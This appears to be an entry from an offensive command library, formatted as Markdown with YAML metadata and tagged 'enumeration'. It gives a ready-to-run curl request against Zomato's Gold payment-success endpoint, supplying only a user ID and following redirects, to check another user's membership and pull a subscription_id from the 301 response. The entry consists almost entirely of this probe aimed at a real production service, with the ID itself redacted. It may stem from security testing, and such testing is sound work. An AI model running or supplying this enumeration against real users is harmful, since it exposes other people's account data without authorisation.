---
id: cmd-uuid-004
data: >-
  curl -X GET "https://www.zomato.com/gold/payment-success?user_id=███████" -i
  -L
tags:
  - web
  - redirect
  - enumeration
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:29.653Z'
verified: false
validated: true
submitted: true
---
# curl-user-id-only

## Command

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?user_id=███████" -i -L
```

## Description

Checks membership by requesting with user_id only and following redirects.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `user_id=███████` | Target user ID | Yes |
| `-L` | Follow redirects | Yes |

## Examples

### Basic Usage

```bash
curl -X GET "https://www.zomato.com/gold/payment-success?user_id=███████" -i -L
```

## Expected Output

301 redirect with subscription_id for members.

## Related

- [[Related Procedure]]
